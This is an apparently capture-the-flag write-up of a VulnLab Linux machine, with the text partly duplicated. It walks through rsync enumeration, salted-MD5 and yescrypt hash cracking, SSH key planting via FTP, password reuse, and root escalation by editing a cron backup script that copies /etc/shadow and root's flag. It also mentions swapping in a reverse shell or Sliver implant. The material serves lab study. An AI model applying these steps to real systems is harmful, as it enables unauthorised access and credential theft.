href=\"#Filesystem-Enumeration\" class=\"headerlink\" title=\"Filesystem Enumeration\"></a>Filesystem Enumeration</h1><p>We now have SSH access as the user <code>triss</code>, though you won’t find a user flag within their home directory.</p>\n<p>We’ll need to pivot to the other users on the machine. If you check the <code>/home</code> directory, you’ll find users <code>httpd</code>, <code>jennifer</code>, <code>sa</code>, and <code>ubuntu</code>. We also aren’t able to run anything as <code>sudo</code> as our current user.</p>\n<p>I tested our creds for <code>triss</code> against all of these users, and we were able to login as <code>jennifer</code> with the same password.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">triss@ip-10-10-200-238:~$ su jennifer</span><br><span class=\"line\">Password: </span><br><span class=\"line\">jennifer@ip-10-10-200-238:/home/triss$ cd ~</span><br><span class=\"line\">jennifer@ip-10-10-200-238:~$ ls</span><br><span class=\"line\">user.txt</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have the user flag, we can enumerate a little further into the machine.</p>\n<p>I dropped <a href=\"https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS\">Linpeas</a> to disk to find the next part of the attack path, though you probably won’t need it. In the root directory of this machine, you’ll find an abnormal <code>backups</code> folder that isn’t common to be seen here. Within the folder itself, you’ll see a list of backups for the machine.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">jennifer@ip-10-10-200-238:/backup$ ls</span><br><span class=\"line\">1717273681.zip  1717274041.zip  1717274401.zip  1717274761.zip  1717275121.zip  1717275481.zip</span><br><span class=\"line\">1717273801.zip  1717274161.zip  1717274521.zip  1717274881.zip  1717275241.zip  1717275601.zip</span><br><span class=\"line\">1717273921.zip  1717274281.zip  1717274641.zip  1717275002.zip  1717275361.zip</span><br></pre></td></tr></table></figure>\n\n<p>I downloaded the first one back to my machine by standing up a Python server on the local SSH session. The first archive’s filename is <code>1717273681.zip</code>, and after decompressing it you’ll find a few interesting files.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ ls</span><br><span class=\"line\">httpd  passwd  rsyncd.conf  shadow</span><br><span class=\"line\"></span><br><span class=\"line\">└─$ cat shadow</span><br><span class=\"line\">......</span><br><span class=\"line\">sa:$y$j9T$jJFOBCaiGJUmyZZRFn5aG1$7pSWDUlnIOlXInoK4nn3gCEIiMp94x8sXaV.DtTzM6D:19468:0:99999:7:::</span><br></pre></td></tr></table></figure>\n\n<p>It seems that a backup of the <code>shadow</code> file was generated and placed within this archive. We can see the hash of the <code>sa</code> user, one of the users that was within the <code>/home</code> directory.</p>\n<p>I’ve dealt with these hashes before, and due to the <code>$y$</code> delimiter in front of the hash means that it is a <code>yescrypt</code> hash. These aren’t able to be cracked through <code>hashcat</code> as I believe it does not support <code>yescrypt</code> hashes. There is a format in <code>JTR</code> that should be able to decrypt it properly.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ john sa.txt --format=crypt --wordlist=/usr/share/wordlists/rockyou.txt</span><br><span class=\"line\">Using default input encoding: UTF-8</span><br><span class=\"line\">Loaded 1 password hash (crypt, generic crypt(3) [?/64])</span><br><span class=\"line\">Cost 1 (algorithm [1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]) is 0 for all loaded hashes</span><br><span class=\"line\">Cost 2 (algorithm specific iterations) is 1 for all loaded hashes</span><br><span class=\"line\">Will run 4 OpenMP threads</span><br><span class=\"line\">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class=\"line\">[...snip...]           (?)     </span><br><span class=\"line\">1g 0:00:00:04 DONE (2024-06-01 16:59) 0.2277g/s 43.73p/s 43.73c/s 43.73C/s daniela..november</span><br><span class=\"line\">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class=\"line\">Session completed.</span><br></pre></td></tr></table></figure>\n\n<p>Viewing the above, you can see that we were successfully able to decrypt this user’s hash and can now determine whether we can log in as them or not. If you run <code>su sa</code> and user their password, you should be able to login successfully.</p>\n<h1 id=\"Escalation-to-Root\"><a href=\"#Escalation-to-Root\" class=\"headerlink\" title=\"Escalation to Root\"></a>Escalation to Root</h1><p>I ran <code>Linpeas</code> one more time to see if there was anything else we could access, as it seems as though we don’t have any <code>sudo</code> privileges as this user either. If you continue to look at the output of Linpeas, you’ll find an odd <code>backup.sh</code> file located with <code>/usr/local/bin</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">**sa@ip-10-10-200-238:/usr/local/bin$ cat backup.sh</span><br><span class=\"line\">#!/bin/bash</span><br><span class=\"line\"></span><br><span class=\"line\">mkdir -p /tmp/backup</span><br><span class=\"line\">cp -r /opt/httpd /tmp/backup</span><br><span class=\"line\">cp /etc/passwd /tmp/backup</span><br><span class=\"line\">cp /etc/shadow /tmp/backup</span><br><span class=\"line\">cp /etc/rsyncd.conf /tmp/backup</span><br><span class=\"line\">......</span><br></pre></td></tr></table></figure>\n\n<p>This file seems to be running in the context of <code>sa</code>, so we can alter our privileges to write to it. Given that this script is pulling <code>shadow</code> from the <code>/etc/shadow</code>, there must be a cronjob&#x2F;task running as <code>root</code>. We know this because we could see the <code>shadow</code> file within the archive when we were retrieving the creds for <code>sa</code>. If this file is owned by <code>sa</code>, the only way it can retrieve the <code>shadow</code> file is if it is a user that has <code>root</code> level permissions.</p>\n<p>To exploit this, we can really do a variety of things. You’ll need to change the permissions of the file with <code>chmod 777</code>, and then we can download it locally to alter it.</p>\n<p>What you do with this file is really up to you. If you want to read the file plain and easy, you can add the following to the file so that it compresses <code>/root/root.txt</code> to the archive.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#!/bin/bash</span><br><span class=\"line\"></span><br><span class=\"line\">mkdir -p /tmp/backup</span><br><span class=\"line\">cp -r /opt/httpd /tmp/backup</span><br><span class=\"line\">cp /etc/passwd /tmp/backup</span><br><span class=\"line\">cp /etc/shadow /tmp/backup</span><br><span class=\"line\">cp /etc/rsyncd.conf /tmp/backup</span><br><span class=\"line\">cp /root/root.txt /tmp/backup</span><br><span class=\"line\">zip -r /backup/$(date +%s).zip /tmp/backup</span><br></pre></td></tr></table></figure>\n\n<p>I also made sure to remove the section where it removes <code>/tmp/backup</code>, so we don’t have to compress it to see the results.</p>\n<p>Another method you could do is upload a reverse shell called <code>backup.sh</code> so the root cronjob will run your reverse shell instead of the backup file.</p>\n<p>After a few minutes of waiting, you can see that the archive will be generated as root.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sa@ip-10-10-200-238:/tmp/backup$ ls</span><br><span class=\"line\">httpd  passwd  root.txt  rsyncd.conf  shadow</span><br></pre></td></tr></table></figure>\n\n<p>Since we were able to downloaded and read the <code>root.txt</code> file, this confirms our theory of the cronjob running as root. This being the case, we have successfully rooted this machine!</p>\n<p>I also altered the file itself so that it would be running a <a href=\"https://github.com/BishopFox/sliver\">Sliver</a> implant instead of the regular archive backup script. As you can see from the below, we received a callback as <code>root</code>. Not required - but just in case you wanted to see how to get a shell as <code>root</code></p>\n<p><img src=\"/images/vulnlab/sync-vl/c.jpg\"></p>\n<h1 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h1><p>This was a really enjoyable machine, as it tested a bit of theory crafted with what was in front of you - especially being able to reverse engineer the hash during the initial foothold. I also enjoyed the credential hunting&#x2F;reusage and the backup script alteration was really enjoyable. Much thanks to xct for the development of this machine!</p>\n<h1 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h1><p><a href=\"https://linux.die.net/man/1/rsync\">https://linux.die.net/man/1/rsync</a><br><a href=\"https://sqlite.org/cli.html\">https://sqlite.org/cli.html</a><br><a href=\"https://hashes.com/en/tools/hash_identifier\">https://hashes.com/en/tools/hash_identifier</a><br><a href=\"https://github.com/DaZ-CYBER/s_md5_hc\">https://github.com/DaZ-CYBER/s_md5_hc</a><br><a href=\"https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS\">https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS</a><br><a href=\"https://github.com/BishopFox/sliver\">https://github.com/BishopFox/sliver</a></p>\n","cover_type":"img","excerpt":"","more":"<p>This is I believe the second Linux machine that I’ve written a post about, and I liked how it delved more into hash cracking and the infamous Docker (oh how I despise Docker). This specific machine is really helpful if you want to understand ports that aren’t used very often such as <code>rsync</code>.</p>\n<h1 id=\"Enumeration\"><a href=\"#Enumeration\" class=\"headerlink\" title=\"Enumeration\"></a>Enumeration</h1><p>Let’s start with our regular NMAP scans.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-31 19:17 EDT</span><br><span class=\"line\">Nmap scan report for 10.10.110.153</span><br><span class=\"line\">Host is up (0.11s latency).</span><br><span class=\"line\">Not shown: 996 closed tcp ports (reset)</span><br><span class=\"line\">PORT    STATE SERVICE</span><br><span class=\"line\">21/tcp  open  ftp</span><br><span class=\"line\">22/tcp  open  ssh</span><br><span class=\"line\">80/tcp  open  http</span><br><span class=\"line\">873/tcp open  rsync</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 13.54 seconds</span><br></pre></td></tr></table></figure>\n\n<p>After a few aggressive scans, you’ll find that there is no anonymous login enabled for FTP. Along with that, both SSH and HTTP are login services (HTTP only having a web login). We’ll need credentials to access any of these - so we’ll turn our attention to the service on <code>873</code>.</p>\n<p>This service is called <a href=\"https://linux.die.net/man/1/rsync\">RSYNC</a>, and is essentially a filesystem mounting&#x2F;share service. It allows administrators to copy files from one particular location in the filesystem to another, or allows them to mount it to a location similar to <code>NFS</code>. This is used if users need to have files copied to another location in a quick-manner. In our case, <code>rsync</code> is a tool that we can examine to determine if there are any files currently within the service that we can retrieve.</p>\n<h1 id=\"RSYNC-File-Enumeration\"><a href=\"#RSYNC-File-Enumeration\" class=\"headerlink\" title=\"RSYNC File Enumeration\"></a>RSYNC File Enumeration</h1><p>First we’ll authenticate with null credentials and list all contents that are currently on the service.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ rsync -av --list-only rsync://10.10.110.153</span><br><span class=\"line\">httpd           web backup</span><br></pre></td></tr></table></figure>\n\n<p>You’ll see that there are two results - <code>httpd</code> and <code>web/backup</code>. The first result <code>httpd</code> is relative to a mount that we can retrieve with the same <code>rsync</code> utility. As for the other results, these are directories within the <code>httpd</code> backup. We can grab both of them with a single command.</p>\n<p>Let’s download the contents of this mount to our local machine. (Note the <code>init_scan.txt</code> file is my NMAP scan)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ rsync -r 10.10.76.90::httpd/ .</span><br><span class=\"line\"></span><br><span class=\"line\">└─$ ls</span><br><span class=\"line\">db  init_scan.txt  migrate  www</span><br></pre></td></tr></table></figure>\n\n<p>This will give us three folders that we can parse, <code>migrate</code>, <code>www</code>, and <code>db</code>.</p>\n<p>The <code>migrate</code> directory seems to be empty and does not have anything within it.</p>\n<p>The <code>www</code> directory seems to be a directory that consists of the content of the website. It has three different files - <code>index.php</code>, <code>dashboard.php</code>, and <code>logout.php</code>. The interesting thing we can pick apart form it is the <code>index.php</code> file, which contains the contents of the login prompt that we receive if we try to access the HTTP service. You’ll notice though at the top of the file we can see the following code.</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$secure</span> = <span class=\"string\">&quot;6c4972f3717a5e881e282ad3105de01e&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;username&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&#x27;Location: dashboard.php&#x27;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;username&#x27;</span>]) &amp;&amp; <span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;password&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$username</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;username&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$password</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;password&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$hash</span> = <span class=\"title function_ invoke__\">md5</span>(<span class=\"string\">&quot;<span class=\"subst\">$secure</span>|<span class=\"subst\">$username</span>|<span class=\"subst\">$password</span>&quot;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$db</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">SQLite3</span>(<span class=\"string\">&#x27;../db/site.db&#x27;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$result</span> = <span class=\"variable\">$db</span>-&gt;<span class=\"title function_ invoke__\">query</span>(<span class=\"string\">&quot;SELECT * FROM users WHERE username = &#x27;<span class=\"subst\">$username</span>&#x27; AND password= &#x27;<span class=\"subst\">$hash</span>&#x27;&quot;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$row</span> = <span class=\"variable\">$result</span>-&gt;<span class=\"title function_ invoke__\">fetchArray</span>(SQLITE3_ASSOC);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$row</span>) &#123;</span><br></pre></td></tr></table></figure>\n\n<p>The above code seems to reference a <code>$hash</code> and includes a secure salt at the top of the page denoted as <code>6c4972f3717a5e881e282ad3105de01e</code>. The page itself seems to be pulling from an SQLITE database, which is within a directory named <code>db</code> that is similar to what we downloaded prior from RSYNC. The format of the hash seems to be <code>$secure|$username|$password</code>, which is the format that the hash uses. Given that we don’t have the username or passwords yet, we’ll move onto the <code>db</code> directory.</p>\n<p>Finally, the <code>db</code> directory contains an SQLITE database file titled <code>site.db</code>. My assumption is that this is the database that the website pulls from. If the website is checking the hashed string with a variable within the database - we might be able to find the same password in plaintext within the database.</p>\n<p>I’ve found out how to interact with SQLITE databases <a href=\"https://sqlite.org/cli.html\">here</a>. We can use <code>sqlite3 site.db</code> to interact with this file. It will bring us to an SQL UI, in which we can simply dump the contents with <code>sqlite&gt; .dump</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sqlite&gt; .dump</span><br><span class=\"line\">PRAGMA foreign_keys=OFF;</span><br><span class=\"line\">BEGIN TRANSACTION;</span><br><span class=\"line\">CREATE TABLE users (</span><br><span class=\"line\">    id INTEGER PRIMARY KEY AUTOINCREMENT,</span><br><span class=\"line\">    username TEXT NOT NULL,</span><br><span class=\"line\">    password TEXT NOT NULL</span><br><span class=\"line\">);</span><br><span class=\"line\">INSERT INTO users VALUES(1,&#x27;admin&#x27;,&#x27;7658a2741c9df3a97c819584db6e6b3c&#x27;);</span><br><span class=\"line\">INSERT INTO users VALUES(2,&#x27;triss&#x27;,&#x27;a0de4d7f81676c3ea9eabcadfd2536f6&#x27;);</span><br><span class=\"line\">DELETE FROM sqlite_sequence;</span><br><span class=\"line\">INSERT INTO sqlite_sequence VALUES(&#x27;users&#x27;,2);</span><br><span class=\"line\">COMMIT;</span><br></pre></td></tr></table></figure>\n\n<p>The <code>users</code> table contains two hash values for two users - <code>admin</code> and <code>triss</code>. Now that we have hashes, usernames, and a secure salt to use - let’s try to crack them. We’ll start with the <code>triss</code> user.</p>\n<p>You’ll notice that some online hashing cracking tools like this one <a href=\"https://hashes.com/en/tools/hash_identifier\">here</a> will tell you that this is an MD5 hash - which it is. The only exception is that we have a salt that is added to the password for its decryption - meaning we need to determine the format in which the salt is used. </p>\n<h1 id=\"Hash-Cracking-w-Python\"><a href=\"#Hash-Cracking-w-Python\" class=\"headerlink\" title=\"Hash Cracking w&#x2F; Python\"></a>Hash Cracking w&#x2F; Python</h1><p>So the whole point of this is to crack the hash and determine how we can utilize said cracked hash to authenticate to the machine - whether that be through the web service or through directly to the machine with SSH&#x2F;FTP. Since we have the user’s hashed password and the salt that the hash uses, we could test some connected strings and put them into <code>hashcat</code>.</p>\n<p>The only issue with that is that it would take a lot of trial and error. We know that the salt, username, and password were all hashed into MD5, however there are at least 100 different MD5 hashing algorithms that <code>hashcat</code> has. We’d eventually get it after a little bit of testing - but why not try to use a bit of coding for this?</p>\n<p>We know that the hash itself just uses a standard MD5 hashing algorithm to combine all three values (salt, username, password). Before they are passed to the MD5 function, they are separated with a delimiter value being <code>|</code>. Since we know how the password is being hashed, we can develop our own brute-force proof-of-concept to see if we can reverse-engineer the hashing algorithm</p>\n<p>I uploaded the code to one of my GitHub repositories that you can find <a href=\"https://github.com/DaZ-CYBER/s_md5_hc\">here</a>. I’m still improving on my coding skills, so you may not be polished 100%. Nonetheless, this ended up doing the job efficiently. The only real caveat to the POC is that it uses <code>rockyou</code> to crack the hashes and essentially just attempts to match the hash of every string in the wordlist with the hexadecimal digest of <code>triss</code>‘s hashed password. If you end up utilizing this for another machine that has the same salt, make sure to change the <code>algorithm_hash</code> value in the code to account for the users password.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ python3 md5.py -s 6c4972f3717a5e881e282ad3105de01e -u triss -w /usr/share/wordlists/rockyou.txt</span><br><span class=\"line\">User: daz</span><br><span class=\"line\">Cracking Hash for: Triss</span><br><span class=\"line\">Initializing...</span><br><span class=\"line\">&#123;&#x27;salt&#x27;: &#x27;6c4972f3717a5e881e282ad3105de01e&#x27;, &#x27;username&#x27;: &#x27;triss&#x27;, &#x27;wordlist&#x27;: &#x27;/usr/share/wordlists/rockyou.txt&#x27;&#125;</span><br><span class=\"line\">.......</span><br><span class=\"line\">Testing [...snip...] against a0de4d7f81676c3ea9eabcadfd2536f6; Match found: [...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>As you can see, it seems as though we received the correct password for the <code>triss</code> user. Let’s try to authenticate to the other parts of the machine with these creds.</p>\n<h1 id=\"FTP-Write-Access-to-SSH\"><a href=\"#FTP-Write-Access-to-SSH\" class=\"headerlink\" title=\"FTP Write Access to SSH\"></a>FTP Write Access to SSH</h1><p>So after some quick password usage you’ll find that you can authenticate to the HTTP server - though we can’t interact with anything on the dashboard. SSH isn’t an avenue we can take at the moment with these creds either - as it seems as though a public key is required to authenticate to <code>triss</code>.</p>\n<p><img src=\"/images/vulnlab/sync-vl/b.jpg\"></p>\n<p>However using our newly-found creds, we’re able to access FTP as the <code>triss</code> user.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ftp&gt; ls -la</span><br><span class=\"line\">229 Entering Extended Passive Mode (|||19317|)</span><br><span class=\"line\">150 Here comes the directory listing.</span><br><span class=\"line\">drwxr-x---    2 1003     1003         4096 Apr 21  2023 .</span><br><span class=\"line\">drwxr-x---    2 1003     1003         4096 Apr 21  2023 ..</span><br><span class=\"line\">lrwxrwxrwx    1 0        0               9 Apr 21  2023 .bash_history -&gt; /dev/null</span><br><span class=\"line\">-rw-r--r--    1 1003     1003          220 Apr 19  2023 .bash_logout</span><br><span class=\"line\">-rw-r--r--    1 1003     1003         3771 Apr 19  2023 .bashrc</span><br><span class=\"line\">-rw-r--r--    1 1003     1003          807 Apr 19  2023 .profile</span><br><span class=\"line\">226 Directory send OK.</span><br></pre></td></tr></table></figure>\n\n<p>This directory that we land in seems to replicate a lot of what we’d see in a home directory on a Linux machine. Although there are no defining factors in any of the files within this directory that tell us this is <code>triss</code>‘s home directory - we can assume it based on the fact that this is where we landed.</p>\n<p>If you take a look at the permissions on the <code>.</code> file (which indicates the current folder), you can see that the owner of this folder has write access onto it. Since we authenticated as the <code>triss</code> user, we should be able to write into this directory and put any files that are needed to get shell access. This is where SSH comes back into the picture.</p>\n<p>If you remember, it wasn’t letting us authenticate to SSH as we needed a public key to be able to authenticate to the machine. Given that we have access to the <code>triss</code> home directory, we could theoretically create an SSH folder and generate a private&#x2F;public key pair that we can use to authenticate through to SSH. Let’s first start by creating a folder named <code>.ssh</code> into the home directory by running <code>ftp&gt; mkdir .ssh</code>.</p>\n<p>Next, we’ll generate an SSH key on our local machine with the below command.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ ssh-keygen -t rsa                           </span><br><span class=\"line\">Generating public/private rsa key pair.</span><br><span class=\"line\">Enter file in which to save the key (/home/daz/.ssh/id_rsa): id_rsa</span><br></pre></td></tr></table></figure>\n\n<p>Make sure to leave the passphrase empty so we don’t have to specify any passwords when attempting to authenticate. A couple things we’ll need to do after generate the <code>private</code> and <code>public</code> key pairs is to change the <code>id_rsa.pub</code> file name to <code>authorized_keys</code> so SSH can utilize it as a proper key file. We’ll also use <code>chmod 600</code> to both files to ensure that we can utilize them properly in the SSH context.</p>\n<p>After that, we’ll upload the <code>authorized_keys</code> file to the SSH directory.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ftp&gt; put authorized_keys</span><br><span class=\"line\">local: authorized_keys remote: authorized_keys</span><br><span class=\"line\">229 Entering Extended Passive Mode (|||16937|)</span><br><span class=\"line\">150 Ok to send data.</span><br><span class=\"line\">100% |*********************************************************************************|   562        2.18 MiB/s    00:00 ETA</span><br><span class=\"line\">226 Transfer complete.</span><br><span class=\"line\">562 bytes sent in 00:00 (2.45 KiB/s)</span><br><span class=\"line\">ftp&gt; ls</span><br><span class=\"line\">229 Entering Extended Passive Mode (|||48072|)</span><br><span class=\"line\">150 Here comes the directory listing.</span><br><span class=\"line\">-rw-------    1 1003     1003          562 Jun 01 20:31 authorized_keys</span><br><span class=\"line\">226 Directory send OK.</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have the <code>authorized_keys</code> file uploaded, we can now authenticate with our private key to the machine. </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ ssh -i id_rsa triss@10.10.118.167</span><br><span class=\"line\">......</span><br><span class=\"line\">triss@ip-10-10-200-238:~$</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"Filesystem-Enumeration\"><a href=\"#Filesystem-Enumeration\" class=\"headerlink\" title=\"Filesystem Enumeration\"></a>Filesystem Enumeration</h1><p>We now have SSH access as the user <code>triss</code>, though you won’t find a user flag within their home directory.</p>\n<p>We’ll need to pivot to the other users on the machine. If you check the <code>/home</code> directory, you’ll find users <code>httpd</code>, <code>jennifer</code>, <code>sa</code>, and <code>ubuntu</code>. We also aren’t able to run anything as <code>sudo</code> as our current user.</p>\n<p>I tested our creds for <code>triss</code> against all of these users, and we were able to login as <code>jennifer</code> with the same password.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">triss@ip-10-10-200-238:~$ su jennifer</span><br><span class=\"line\">Password: </span><br><span class=\"line\">jennifer@ip-10-10-200-238:/home/triss$ cd ~</span><br><span class=\"line\">jennifer@ip-10-10-200-238:~$ ls</span><br><span class=\"line\">user.txt</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have the user flag, we can enumerate a little further into the machine.</p>\n<p>I dropped <a href=\"https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS\">Linpeas</a> to disk to find the next part of the attack path, though you probably won’t need it. In the root directory of this machine, you’ll find an abnormal <code>backups</code> folder that isn’t common to be seen here. Within the folder itself, you’ll see a list of backups for the machine.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">jennifer@ip-10-10-200-238:/backup$ ls</span><br><span class=\"line\">1717273681.zip  1717274041.zip  1717274401.zip  1717274761.zip  1717275121.zip  1717275481.zip</span><br><span class=\"line\">1717273801.zip  1717274161.zip  1717274521.zip  1717274881.zip  1717275241.zip  1717275601.zip</span><br><span class=\"line\">1717273921.zip  1717274281.zip  1717274641.zip  1717275002.zip  1717275361.zip</span><br></pre></td></tr></table></figure>\n\n<p>I downloaded the first one back to my machine by standing up a Python server on the local SSH session. The first archive’s filename is <code>1717273681.zip</code>, and after decompressing it you’ll find a few interesting files.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ ls</span><br><span class=\"line\">httpd  passwd  rsyncd.conf  shadow</span><br><span class=\"line\"></span><br><span class=\"line\">└─$ cat shadow</span><br><span class=\"line\">......</span><br><span class=\"line\">sa:$y$j9T$jJFOBCaiGJUmyZZRFn5aG1$7pSWDUlnIOlXInoK4nn3gCEIiMp94x8sXaV.DtTzM6D:19468:0:99999:7:::</span><br></pre></td></tr></table></figure>\n\n<p>It seems that a backup of the <code>shadow</code> file was generated and placed within this archive. We can see the hash of the <code>sa</code> user, one of the users that was within the <code>/home</code> directory.</p>\n<p>I’ve dealt with these hashes before, and due to the <code>$y$</code> delimiter in front of the hash means that it is a <code>yescrypt</code> hash. These aren’t able to be cracked through <code>hashcat</code> as I believe it does not support <code>yescrypt</code> hashes. There is a format in <code>JTR</code> that should be able to decrypt it properly.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ john sa.txt --format=crypt --wordlist=/usr/share/wordlists/rockyou.txt</span><br><span class=\"line\">Using default input encoding: UTF-8</span><br><span class=\"line\">Loaded 1 password hash (crypt, generic crypt(3) [?/64])</span><br><span class=\"line\">Cost 1 (algorithm [1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]) is 0 for all loaded hashes</span><br><span class=\"line\">Cost 2 (algorithm specific iterations) is 1 for all loaded hashes</span><br><span class=\"line\">Will run 4 OpenMP threads</span><br><span class=\"line\">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class=\"line\">[...snip...]           (?)     </span><br><span class=\"line\">1g 0:00:00:04 DONE (2024-06-01 16:59) 0.2277g/s 43.73p/s 43.73c/s 43.73C/s daniela..november</span><br><span class=\"line\">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class=\"line\">Session completed.</span><br></pre></td></tr></table></figure>\n\n<p>Viewing the above, you can see that we were successfully able to decrypt this user’s hash and can now determine whether we can log in as them or not. If you run <code>su sa</code> and user their password, you should be able to login successfully.</p>\n<h1 id=\"Escalation-to-Root\"><a href=\"#Escalation-to-Root\" class=\"headerlink\" title=\"Escalation to Root\"></a>Escalation to Root</h1><p>I ran <code>Linpeas</code> one more time to see if there was anything else we could access, as it seems as though we don’t have any <code>sudo</code> privileges as this user either. If you continue to look at the output of Linpeas, you’ll find an odd <code>backup.sh</code> file located with <code>/usr/local/bin</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">**sa@ip-10-10-200-238:/usr/local/bin$ cat backup.sh</span><br><span class=\"line\">#!/bin/bash</span><br><span class=\"line\"></span><br><span class=\"line\">mkdir -p /tmp/backup</span><br><span class=\"line\">cp -r /opt/httpd /tmp/backup</span><br><span class=\"line\">cp /etc/passwd /tmp/backup</span><br><span class=\"line\">cp /etc/shadow /tmp/backup</span><br><span class=\"line\">cp /etc/rsyncd.conf /tmp/backup</span><br><span class=\"line\">......</span><br></pre></td></tr></table></figure>\n\n<p>This file seems to be running in the context of <code>sa</code>, so we can alter our privileges to write to it. Given that this script is pulling <code>shadow</code> from the <code>/etc/shadow</code>, there must be a cronjob&#x2F;task running as <code>root</code>. We know this because we could see the <code>shadow</code> file within the archive when we were retrieving the creds for <code>sa</code>. If this file is owned by <code>sa</code>, the only way it can retrieve the <code>shadow</code> file is if it is a user that has <code>root</code> level permissions.</p>\n<p>To exploit this, we can really do a variety of things. You’ll need to change the permissions of the file with <code>chmod 777</code>, and then we can download it locally to alter it.</p>\n<p>What you do with this file is really up to you. If you want to read the file plain and easy, you can add the following to the file so that it compresses <code>/root/root.txt</code> to the archive.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#!/bin/bash</span><br><span class=\"line\"></span><br><span class=\"line\">mkdir -p /tmp/backup</span><br><span class=\"line\">cp -r /opt/httpd /tmp/backup</span><br><span class=\"line\">cp /etc/passwd /tmp/backup</span><br><span class=\"line\">cp /etc/shadow /tmp/backup</span><br><span class=\"line\">cp /etc/rsyncd.conf /tmp/backup</span><br><span class=\"line\">cp /root/root.txt /tmp/backup</span><br><span class=\"line\">zip -r /backup/$(date +%s).zip /tmp/backup</span><br></pre></td></tr></table></figure>\n\n<p>I also made sure to remove the section where it removes <code>/tmp/backup</code>, so we don’t have to compress it to see the results.</p>\n<p>Another method you could do is upload a reverse shell called <code>backup.sh</code> so the root cronjob will run your reverse shell instead of the backup file.</p>\n<p>After a few minutes of waiting, you can see that the archive will be generated as root.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sa@ip-10-10-200-238:/tmp/backup$ ls</span><br><span class=\"line\">httpd  passwd  root.txt  rsyncd.conf  shadow</span><br></pre></td></tr></table></figure>\n\n<p>Since we were able to downloaded and read the <code>root.txt</code> file, this confirms our theory of the cronjob running as root. This being the case, we have successfully rooted this machine!</p>\n<p>I also altered the file itself so that it would be running a <a href=\"https://github.com/BishopFox/sliver\">Sliver</a> implant instead of the regular archive backup script. As you can see from the below, we received a callback as <code>root</code>. Not required - but just in case you wanted to see how to get a shell as 